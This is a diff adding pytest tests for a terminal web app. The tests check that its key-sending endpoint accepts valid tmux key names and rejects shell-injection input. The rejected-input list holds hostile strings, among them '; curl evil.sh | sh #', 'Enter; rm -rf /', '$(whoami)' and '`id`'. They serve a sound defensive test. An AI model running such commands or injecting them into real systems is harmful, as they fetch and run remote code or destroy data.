@@ -123,3 +123,29 @@ def test_tui_jump_to_bottom_blasts_wheel_down(term_client):
     # a big batch of wheel-down to reach the live tail; no copy-mode cancel here
     assert cmds == [f"send-keys -t chat -H {_wheel_hex(False, 400)}"]
     assert not any("cancel" in c for c in cmds)
+
+
+# --- /api/terminal/send key allowlist (command-injection guard) ---
+
+@pytest.mark.parametrize("key", ["Enter", "Escape", "C-c", "M-Up", "F5", "DC", "BSpace"])
+def test_send_accepts_valid_tmux_key_names(term_client, key):
+    resp = term_client.post("/api/terminal/send", json={"session": "chat", "key": key})
+    assert resp.status_code == 200
+    # the key reaches tmux verbatim as a send-keys argument
+    assert any(c == f"send-keys -t chat {key}" for c in _scroll_calls(term_client))
+
+
+@pytest.mark.parametrize("payload", [
+    "; curl evil.sh | sh #",
+    "Enter; rm -rf /",
+    "$(whoami)",
+    "`id`",
+    "a b",            # space would split into extra shell words
+    "'",              # quote-break attempt
+    "x" * 21,         # over the length cap
+])
+def test_send_rejects_injection_in_key(term_client, payload):
+    resp = term_client.post("/api/terminal/send", json={"session": "chat", "key": payload})
+    assert resp.status_code == 400
+    # nothing was ever sent to tmux for the rejected key
+    assert not any("send-keys" in c for c in _scroll_calls(term_client))
